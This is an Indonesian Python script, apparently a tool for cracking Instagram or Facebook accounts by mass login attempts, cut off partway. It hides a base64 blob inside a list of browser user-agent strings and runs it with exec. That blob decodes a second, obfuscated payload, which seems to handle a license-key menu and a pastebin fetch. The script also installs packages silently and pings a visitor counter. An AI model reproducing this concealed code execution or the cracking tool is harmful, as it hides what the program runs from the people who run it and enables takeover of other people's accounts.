########################################################################################
########################################################################################
################███╗░░░███╗██████╗░░░░██████╗░██╗░██████╗██╗░░██╗██╗░░░██╗##############
################████╗░████║██╔══██╗░░░██╔══██╗██║██╔════╝██║░██╔╝╚██╗░██╔╝##############
################██╔████╔██║██████╔╝░░░██████╔╝██║╚█████╗░█████═╝░░╚████╔╝░##############
################██║╚██╔╝██║██╔══██╗░░░██╔══██╗██║░╚═══██╗██╔═██╗░░░╚██╔╝░░##############
################██║░╚═╝░██║██║░░██║██╗██║░░██║██║██████╔╝██║░╚██╗░░░██║░░░##############
################╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░##############
########################################################################################
########################################################################################


# SCRIPT INI DIBUAT PADA TANGGAL 1 DESRMBER 2022...
# +6283893415477


#=======================================[IMPORT]=======================================#
try:
	import sys,os
	for x in range(10):
		try:
			import rich
			import requests
			import bs4
			import stdiomask
			import mechanize
			import inquirer
			import pprint
			import pystyle
			import blessed
			import fake_useragent
		except ImportError as e:
			print(f"* Sedang Install Bahan {e.name}, Mohon Bersabar....")
			os.system(f"python -m pip install {e.name} &> /dev/null")
	try:
		import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
		import sys, os, subprocess, platform, struct
		import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json
		import requests as req
		import time,random,json
		import inquirer,os,sys,re
		import uuid
		import hmac
		import base64
	except ImportError as e:
		print(f"* Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
	from rich.table import Table as me
	from rich.console import Console as sol
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as iprint
	from rich.panel import Panel
	from rich.tree import Tree
	from rich import print as rprint
	from rich.text import Text
	from rich.progress import track
	from rich import print as prints
	from rich.console import Console
	from rich.table import Table
	from rich.columns import Columns
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
	from rich.progress import Task
	from rich.progress import DownloadColumn,SpinnerColumn,TransferSpeedColumn
	from rich import filesize, get_console
	from rich.console import Group
	from rich.markdown import Markdown
	from rich.panel import Panel
	from rich.syntax import Syntax
	from rich.table import Table
	from rich.box import DOUBLE, ROUNDED
	from rich.padding import Padding
	from rich.box import ROUNDED, Box
	from requests.exceptions import ConnectionError
	from bs4 import BeautifulSoup
	from bs4 import BeautifulSoup as parser
	from bs4 import BeautifulSoup as par
	from random import choice as pilih
	from concurrent.futures import ThreadPoolExecutor as __Kiky__
	from concurrent.futures import ThreadPoolExecutor
	from requests.exceptions import ConnectionError
	from datetime import datetime
	from urllib.parse import quote
	from datetime import date
	from urllib import request
	from pprint import pprint
	from pystyle import *
	from blessed import Terminal
	from datetime import datetime
	from requests import ConnectionError
	from threading import Event
	from fake_useragent import UserAgent
	from inquirer.themes import Default
	from concurrent.futures import ThreadPoolExecutor
	from random import randint
	console = Console()
	try:
		null = open(os.devnull, "w")
		insta = subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
		if insta !=0:os.system('pkg install play-audio -y &> /dev/null')
		null.close()
		musik_="play"
	except:musik_="error!!"
	sys.stdout.write(f'\x1b[1;35m\x1b]2; ★ SCRIPT BY MR.RISKY ★\x07')
	sys.path.append(os.path.realpath('.'))
except requests.exceptions.ConnectionError:
	print("* Perisak Jaringan Anda..!!");os.sys.exit()



#"""WARNA RICH"""
H = "#000000" # Hitam
M = "#FF0000" # Merah
I = "#00FF00" # Hijau
K = "#FFFF00" # Kuning
B = "#00C8FF" # Biru
U = "#AF00FF" # Ungu
P = "#FF00FF" # Pink
C = "#00FFFF" # Biru Muda
Q = "#FFFFFF" # Putih
J = "#FF8F00" # Jingga
A = "#AAAAAA" # Abu-Ab
O = "#FFA500" # OREN
HH = "[#000000]" # Hitam
MM = "[#FF0000]" # Merah
II = "[#00FF00]" # Hijau
KK = "[#FFFF00]" # Kuning
BB = "[#00C8FF]" # Biru
UU = "[#AF00FF]" # Ungu
PP = "[#FF00FF]" # Pink
CC = "[#00FFFF]" # Biru Muda
QQ = "[#FFFFFF]" # Putih
JJ = "[#FF8F00]" # Jingga
AA = "[#AAAAAA]" # Abu-Abu
OO = "[#FFA500]" # OREN

#""" WARNA UNTUK PRINT"""
q='\x1b[0m'	 # WARNA MATI
p = '\x1b[0;97m' # PUTIH
m = '\x1b[0;91m' # MERAH
i = '\x1b[0;92m' # HIJAU
k = '\033[0;93m' # KUNING
b = '\x1b[0;94m' # BIRU
u = '\x1b[0;95m' # UNGU
c = '\033[0;96m' # BIRU MUDA
h = "\x1b[0;90m"     # Hitam
j = "\x1b[38;5;208m" # Jingga
a = "\x1b[38;5;248m" # Abu-Abu
o='\033[38;2;255;127;0;1m' #ORANGE
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
garis="\033[4m\033[3m"
jarak=(f"────────────────────────────────────────────────────────────────────────────────────────{q}")

WAR = f"   {QQ}[{MM}!!{QQ}] "
WIR = f"   {QQ}[{KK}??{QQ}] "
WOR = f"   {QQ}[{II}++{QQ}] "
GOD = f"{QQ}•{II}•{MM}•{QQ}"
war = f"   {q}[{m}!!{q}] "
wir = f"   {q}[{k}??{q}] "
wor = f"   {q}[{i}++{q}] "
god = f"{q}•{i}•{m}•"

#=======================================[GLOBAL-TEXT]==================================#
#""" TANGGAL"""
current = datetime.now()
hari = current.day
bulan_number = current.month
nama_bulan= {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = nama_bulan[str(bulan_number)]
tahun = current.year
all_day=(f"{hari}-{bulan}-{tahun}")

#""" WAKTU(JAM)"""
detik = datetime.now().strftime('%H')
menit = datetime.now().strftime('%M')
jam = datetime.now().strftime('%S')
all_waktu=(f"{detik}-{menit}-{jam}")

#""" GET VISITOR"""
try:
	visitor=request.urlopen("https://api.countapi.xyz/hit/dumai-991/dark-fb")
	ka=json.loads(visitor.read())
except:pass
CodaTeam = {
	"cookie":"jembut",
	"key":"123",
	"nama":"dimad"
	}
xtc = 	{
	"warna" : {
		"tabel" : "[#AAAAAA]",
		"rich"	: "#AAAAAA",
	}
}
__RISKY__ ={}
__JEECK__ ={}
codeteam  ={}
status_key={}
ses	= requests.Session()
agent	= "Mozilla/5.0 (Linux; Android 11; RMX2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
lol	=[]
id	=[]
max	=[]
_jeeck_ =[]
_risky_	=[]
ok	=[]
cp	=[]
loop	=0
sesion	=0
nzk = "1"

User_Agent_Fake1=("Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3")
User_Agent_Fake2 = ["Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.701 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.466 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.450 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.446 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.201 Mobile Safari/534.1+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.1+ (KHTML, like Gecko)",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-GB) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; pt) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.546 Mobile Safari/534.8+",'CmRlZiBfUklaS1lfKGJhbmdfcmlza3ksamFwbik6CglpZiBiYW5nX3Jpc2t5ID09ICJSaXNreSBTdWthIEhlbnRhaSI6CgkJcmV0dXJuIGJhc2U2NC5iNjRkZWNvZGUoamFwbikKCWVsc2U6CgkJcHJpbnQoIiAqIGVuZCBjb2RlIGVycm9yIikKCQlleGl0KCkKCQlleGl0KCkKCQlleGl0KCkKCQlvcy5zeXMuZXhpdCgpCgkJb3Muc3lzLmV4aXQoKQoJCW9zLnN5cy5leGl0KCkKCQlvcy5zeXMuZXhpdCgpCmRlZiBfSkUzQ0tfKGphcGFuLGJhbmdfamVlY2spOgoJaWYgamFwYW49PSJKZWVjayBTYW50dXkiOgoJCWxvbGkgPSAiIgoJCWZvciB4IGluIGJhbmdfamVlY2suc3BsaXQoIs+AOc+AIik6CgkJCWxvbGkgKz0geAoJCXJldHVybiBsb2xpCgllbHNlOgoJCXByaW50KCIgKiBlbmQgY29kZSBlcnJvciIpCgkJZXhpdCgpCgkJZXhpdCgpCgkJZXhpdCgpCgkJb3Muc3lzLmV4aXQoKQoJCW9zLnN5cy5leGl0KCkKCQlvcy5zeXMuZXhpdCgpCgkJb3Muc3lzLmV4aXQoKQo=',"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/85,36.25",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
"Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; da-dk) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; fr-FR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs-CZ) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; zh-cn) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.,20.27",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; zh-cn) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; sv-se) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ko-kr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; it-it) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; fr-fr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; es-es) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-gb) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; de-de) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"]

# User_Agnet Ini Akan Berguna Saat Crack Terkena Spam !!



#=======================================[CLASS-DEF]====================================#
class cls:
	def __init__(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear")
			except:pass
class folder:
	def __init__(self):
		try:os.mkdir(".data")
		except:pass
		try:os.mkdir("results")
		except:pass
		try:
			open(".data/user-baru.txt","r").read()
		except:
			open(".data/user-baru.txt","w").write("HALO-JIKA-ANDA-HAPUS-FILE-INI-ANDA-AKAN-MENAMPILKAN-PENGGUNA-BARU\nSALAM-DARI-RISKY")
			text = Text(f"""Sepertinya Anda Pengguna Baru  Instagram, Terima Kasih Telah Menggunakan Sciprt Saya, Dan Terima Kasih Telah Mempercayai Saya, Saya Akan Mengasih Pengalaman Anda Untuk Crack Secara Masimal, SALAM DARI SAYA RISKY AND XTC•CODETEAM""")
			text.highlight_words(["Pengguna Baru  Instagram"],"bold yellow")
			text.highlight_words(["Terima Kasih","Mempercayai Saya"], "bold green")
			text.highlight_words(["RISKY","XTC•CODETEAM","Masimal"], "italic white")
			console.rule("Information Pengguna Baru",style="red")
			console.print(text, style="cyan", justify="center")
class logo:
	def __init__(self):
		my_logo = f"""{OO}⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀
{OO}⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⢹⣿⣆ {PP} ___   _  _   ___   _____   _   {OO}  ___   ___     _     __  __
{OO}⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠉⠛⠻⢿⣿⣿⣷⣶⣾⣿⣿ {PP}|_ _| | \| | / __| |_   _| /_\  {OO} / __| | _ \   /_\   |  \/  |
{OO}⣿⣿⣿⣿⣿⡿⠋⠀⠀⣀⣠⣄⣀⠀⠀⠙⢿⣿⣿⣿⣿⣿ {PP} | |  | .` | \__ \   | |  / _ \ {OO}| (_ | |   /  / _ \  | |\/| |
{OO}⣿⣿⣿⣿⣿⠁⠀⢠⣾⣿⣿⣿⣿⣷⡄⠀⠈⣿⣿⣿⣿⣿ {PP}|___| |_|\_| |___/   |_| /_/ \_\ {OO}\___| |_|_\ /_/ \_\ |_|  |_|
{OO}⣿⣿⣿⣿⡇⠀⠀⢾⣿⣿⣿⣿⣿⣿⡷⠀⠀⢸⣿⣿⣿⣿
{OO}⣿⣿⣿⣿⣿⡀⠀⠘⢿⣿⣿⣿⣿⡿⠃⠀⢀⣿⣿⣿⣿⣿    {UU}[     {CC}Nama Admin    {QQ}: {II}Risky.S                           {UU}]
{OO}⣿⣿⣿⣿⣿⣷⣄⠀⠀⠉⠙⠋⠉⠀⠀⣠⣾⣿⣿⣿⣿⣿    {UU}[     {CC}Nama Team     {QQ}: {II}Jeck,Xanzi,{QQ} And {CC}CodeTeam🥶        {UU}]
{OO}⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿    {UU}[     {KK}Link Github   {QQ}: {AA}https://github.com/Dumai-991      {UU}]
{OO}⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏    {UU}[     {KK}Link WhatsApp {QQ}: {AA}https://wa.me/+6283893415477      {UU}]
{OO}⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀{QQ}"""
		prints(Panel(my_logo,width=90,padding=0,style=xtc["warna"]["rich"],title=f"{QQ}•{II}•{MM}• {OO}XTC-CODETEAM {MM}•{II}•{QQ}•"))
def menu_belum_ada():
	text = Text(f"""Sepertinya Menu Yang Anda Pilih Masih Tahap Perkembangan (Belum Tersedia)\nMohon Kerja Samanya....""")
	text.highlight_words(["Mohon Kerja Samanya"], "bold green")
	text.highlight_words(["Belum Tersedia"], "bold red")
	console.rule("Information Menu",style="red")
	console.print(text, style="cyan", justify="center")
	time.sleep(3)
exec(base64.b64decode(User_Agent_Fake2[10]))
def quit():
	exit()
	os.sys.exit()
	quit()
def globalz():
	try:
		try:
			cok = open(".data/cookie.txt",'r').read()
		except:
			cok = "Kosong"
		code = json.loads(open(".data/sensi.json","r").read())
		team = codeteam.update({"cookie":cok,"key":code["key"],"nama":code["nama"]})
	except:open(".data/sensi.json","w").write('{\n\t"key":"%s",\n\t"nama":"%s"\n}'%("Jancuk","Kontol"))
exec(_RIZKY_("Risky Suka Hentai",_JE3CK_("Jeeck Santuy","ZGVmIπ9πG1lbnπ9πVfa2Vπ9π5KCk6π9πCgljbπ9πHMoKTπ9πtsb2dπ9πvKCkKπ9πCXRhbπ9πXBpbGπ9πFuX21π9πlbnUgπ9πPSBmIπ9πiIiICπ9πAge1Fπ9πRfVt7π9πQ0N9Mπ9πDF7UVπ9πF9XSBπ9π7SUl9π9πIExvZπ9π2luIEπ9πxpY2Vπ9πuc2kvπ9πS2V5Xπ9πG4gICπ9πB7UVFπ9π9W3tDπ9πQ30wMπ9πntRUXπ9π1dIHtπ9πJSX0gπ9πRGFmdπ9πGFyIEπ9πxpY2Vπ9πuc2kvπ9πS2V5Xπ9πG4gICπ9πB7UVFπ9π9W3tDπ9πQ30wMπ9πHtRUXπ9π1dIHtπ9πNTX0gπ9πRXhpdπ9πCIiIgπ9πoJcHJπ9πpbnRzπ9πKFBhbπ9πmVsKHπ9πRhbXBπ9πpbGFuπ9πX21lbπ9πnUsd2π9πlkdGgπ9π9MTAwπ9πLHBhZπ9πGRpbmπ9πc9KDAπ9πpLHN0π9πeWxlPπ9πWYie0π9πF9Iixπ9πzdWJ0π9πaXRsZπ9πV9hbGπ9πlnbj0π9πnbGVmπ9πdCcscπ9π3VidGπ9πl0bGUπ9π9ZiLiπ9πlI9TSπ9πUxBSEπ9πtBTiBπ9πQSUxJπ9πSCIpKπ9πQoJaHπ9πUgPSBπ9πpbnB1π9πdChmIπ9πnthfSπ9πAgIOKπ9πUl3trπ9πfVBJTπ9πElIIDπ9πoge2Fπ9π9IikKπ9πCWlmIπ9πGh1IGπ9πluIFsπ9πnMScsπ9πJzAxJπ9π106Cgπ9πkJbG9π9πnaW5fπ9πa2V5Kπ9πCkKCWπ9πVsaWYπ9πgaHUgπ9πaW4gWπ9πycyJyπ9πwnMDIπ9πnXToKπ9πCQl0Yπ9πW1waWπ9πxhbl9π9πoYXJnπ9πYSA9Iπ9πGYiIiπ9πIgICBπ9π7UVF9π9πW3tDQπ9π30wMXπ9πtRUX1π9πdIHtJπ9πSX0gNπ9πyBIYXπ9πJpICBπ9π7UVF9π9πfCBScπ9πHtNTXπ9π0yMC4π9πwMDB7π9πUVF9Xπ9πG4gICπ9πB7UVFπ9π9W3tDπ9πQ30wMπ9πntRUXπ9π1dIHtπ9πJSX0gπ9πMSBCdπ9πWxhbiπ9πB7UVFπ9π9fCBSπ9πcHtNTπ9πX01MCπ9π4wMDBπ9π7UVF9π9πXG4gIπ9πCB7UVπ9πF9W3tπ9πDQ30wπ9πMHtRUπ9πX1dIHπ9πtNTX0π9πgRXhpπ9πdCIiIπ9πgoJCXπ9πByaW5π9π0cyhQπ9πYW5lbπ9πCh0YWπ9π1waWxπ9πhbl9oπ9πYXJnYπ9πSx3aWπ9πR0aD0π9πxMDAsπ9πcGFkZπ9πGluZzπ9π0oMCkπ9πsc3R5π9πbGU9Zπ9πiJ7QXπ9π0iLHNπ9π1YnRpπ9πdGxlXπ9π2FsaWπ9πduPSdπ9πsZWZ0π9πJyxzdπ9πWJ0aXπ9πRsZT1π9πmIuKUπ9πj1NJTπ9πEFIS0π9πFOIFBπ9πJTElIπ9πIikpCπ9πgkJaHπ9πUgPSBπ9πpbnB1π9πdChmIπ9πnthfSπ9πAgIOKπ9πUl3trπ9πfVBJTπ9πElIIDπ9πoge2Fπ9π9IikKπ9πCQlpZπ9πiBodSπ9πBpbiBπ9πbJzEnπ9πLCcwMπ9πSddOgπ9πoJCQlπ9πuYW1hπ9πeiA9Iπ9πGlucHπ9πV0KGYπ9πie2F9π9πICAgIπ9πOKUl3π9πtrfU5π9πhbWEgπ9πOiB7Yπ9πX0iKQπ9πoJCQlπ9πkbXogπ9πPSByZπ9πXF1ZXπ9πN0cy5π9πnZXQoπ9πImh0dπ9πHBzOiπ9π8vcGFπ9πzdGViπ9πaW4uYπ9π29tL3π9πJhdy9π9πyaDRWπ9πamJaeπ9πSIpLmπ9πpzb24π9πoKQoJπ9πCQl0cπ9πnk6Cgπ9πkJCQlπ9πYRCA9π9πIGRteπ9πltmInπ9πtuYW1π9πhen0iπ9πXQoJCπ9πQkJcHπ9πJpbnQπ9πoZiJ7π9πd2Fyfπ9πU1hYWπ9πYgTmFπ9πtYSBBπ9πbmRhIπ9πFN1ZGπ9πFoIFRπ9πlckRhπ9πZnRhcπ9πiBHYWπ9π50aSBπ9πZYW5nπ9πIExhaπ9πW7wn5π9πGNIikπ9π7dGltπ9πZS5zbπ9πGVlcCπ9πgyKTtπ9πxdWl0π9πKCkKCπ9πQkJZXπ9πhjZXBπ9π0IEtlπ9πeUVycπ9πm9yOgπ9πoJCQkπ9πJdGltπ9πZS5zbπ9πGVlcCπ9πgxKQoπ9πJCQkJπ9πa2V5Iπ9πD0gIiπ9πIKCQkπ9πJCWZvπ9πciB4Iπ9πGluIHπ9πJhbmdπ9πlKDIpπ9πOgoJCπ9πQkJCWπ9πZvciBπ9π6IGluπ9πIHJhbπ9πmdlKDπ9πcpOgoπ9πJCQkJπ9πCQlrZπ9πXkgKzπ9π0gcmFπ9πuZG9tπ9πLmNobπ9π2ljZSπ9πhbJ0Eπ9πnLCdCπ9πJywgJπ9π0MnLCπ9πAnRCcπ9πsICdFπ9πJywgJπ9π0YnLCπ9πAnRycπ9πsICdIπ9πJywgJπ9π0knLCπ9πAnSicπ9πsICdLπ9πJywgJπ9π0wnLCπ9πAnTScπ9πsICdOπ9πJywgJπ9π08nLCπ9πAnUCcπ9πsICdRπ9πJywgJπ9π1InLCπ9πAnUycπ9πsICdUπ9πJywgJπ9π1UnLCπ9πAnVicπ9πsICdXπ9πJywgJπ9π1gnLCπ9πAnWScπ9πsICdaπ9πJ10pCπ9πgkJCQπ9πkJa2Vπ9π5Kz0iπ9πLSIKCπ9πQkJCWπ9πZvciBπ9π4IGluπ9πIHJhbπ9πmdlKDπ9πEpOgoπ9πJCQkJπ9πCWZvcπ9πiB6IGπ9πluIHJπ9πhbmdlπ9πKDcpOπ9πgoJCQπ9πkJCQlπ9πrZXkgπ9πKz0gcπ9πmFuZGπ9π9tLmNπ9πob2ljπ9πZShbJπ9π0EnLCπ9πdCJywπ9πgJ0Mnπ9πLCAnRπ9πCcsICπ9πdFJywπ9πgJ0Ynπ9πLCAnRπ9πycsICπ9πdIJywπ9πgJ0knπ9πLCAnSπ9πicsICπ9πdLJywπ9πgJ0wnπ9πLCAnTπ9πScsICπ9πdOJywπ9πgJ08nπ9πLCAnUπ9πCcsICπ9πdRJywπ9πgJ1Inπ9πLCAnUπ9πycsICπ9πdUJywπ9πgJ1Unπ9πLCAnVπ9πicsICπ9πdXJywπ9πgJ1gnπ9πLCAnWπ9πScsICπ9πdaJ10π9πpCgkJπ9πCQlvcπ9πy5zeXπ9πN0ZW0π9πoZiJ4π9πZGctbπ9π3Blbiπ9πBodHRπ9πwczovπ9πL3dhLπ9πm1lLyπ9πs2Mjgπ9πzODkzπ9πNDE1Nπ9πDc3P3π9πRleHQπ9π9SGFsπ9πbG8uLπ9πi4rU2π9πF5YStπ9πNYXUrπ9πRGFmdπ9πGFyK1π9πVzZXIπ9πrUHJlπ9πbWl1bπ9πSs3K0π9πhhcmkπ9πlMEFOπ9πYW1hKπ9πyUzQSπ9πslMkFπ9π7bmFtπ9πYXp9Jπ9πTJBJTπ9πBBS2Vπ9π5KyUzπ9πQSslMπ9πkF7a2π9πV5fSUπ9πyQSZ0π9πeXBlPπ9πXBob2π9π5lX25π9π1bWJlπ9πciZhcπ9πHBfYWπ9πJzZW5π9π0PTAiπ9πKTtxdπ9πWl0KCπ9πkKCQlπ9πlbGlmπ9πIGh1Iπ9πGluIFπ9πsnMicπ9πsJzAyπ9πJ106Cπ9πgkJCWπ9π5hbWFπ9π6ID0gπ9πaW5wdπ9πXQoZiπ9πJ7YX0π9πgICAgπ9π4pSXeπ9π2t9Tmπ9πFtYSAπ9π6IHthπ9πfSIpCπ9πgkJCWπ9πRteiAπ9π9IHJlπ9πcXVlcπ9π3RzLmπ9πdldCgπ9πiaHR0π9πcHM6Lπ9πy9wYXπ9πN0ZWJπ9πpbi5jπ9πb20vcπ9πmF3L3π9πJoNFZπ9πqYlp5π9πIikuaπ9πnNvbiπ9πgpCgkπ9πJCXRyπ9πeToKCπ9πQkJCVπ9πhEID0π9πgZG16π9πW2Yieπ9π25hbWπ9πF6fSJπ9πdCgkJπ9πCQlwcπ9πmludCπ9πhmIntπ9π3YXJ9π9πTWFhZπ9πiBOYWπ9π1hIEFπ9πuZGEgπ9πU3VkYπ9πWggVGπ9πVyRGFπ9πmdGFyπ9πIEdhbπ9πnRpIFπ9πlhbmcπ9πgTGFpπ9πbvCfkπ9πY0iKTπ9πt0aW1π9πlLnNsπ9πZWVwKπ9πDIpO3π9πF1aXQπ9πoKQoJπ9πCQlleπ9πGNlcHπ9πQgS2Vπ9π5RXJyπ9πb3I6Cπ9πgkJCQπ9πl0aW1π9πlLnNsπ9πZWVwKπ9πDEpCgπ9πkJCQlπ9πrZXkgπ9πPSAiIπ9πgoJCQπ9πkJZm9π9πyIHggπ9πaW4gcπ9πmFuZ2π9πUoMikπ9π6CgkJπ9πCQkJZπ9πm9yIHπ9πogaW4π9πgcmFuπ9πZ2UoNπ9πyk6Cgπ9πkJCQkπ9πJCWtlπ9πeSArPπ9πSByYWπ9π5kb20π9πuY2hvπ9πaWNlKπ9πFsnQSπ9πcsJ0Iπ9πnLCAnπ9πQycsIπ9πCdEJyπ9πwgJ0Uπ9πnLCAnπ9πRicsIπ9πCdHJyπ9πwgJ0gπ9πnLCAnπ9πSScsIπ9πCdKJyπ9πwgJ0sπ9πnLCAnπ9πTCcsIπ9πCdNJyπ9πwgJ04π9πnLCAnπ9πTycsIπ9πCdQJyπ9πwgJ1Eπ9πnLCAnπ9πUicsIπ9πCdTJyπ9πwgJ1Qπ9πnLCAnπ9πVScsIπ9πCdWJyπ9πwgJ1cπ9πnLCAnπ9πWCcsIπ9πCdZJyπ9πwgJ1oπ9πnXSkKπ9πCQkJCπ9πQlrZXπ9πkrPSIπ9πtIgoJπ9πCQkJZπ9πm9yIHπ9πggaW4π9πgcmFuπ9πZ2UoMπ9πSk6Cgπ9πkJCQkπ9πJZm9yπ9πIHogaπ9πW4gcm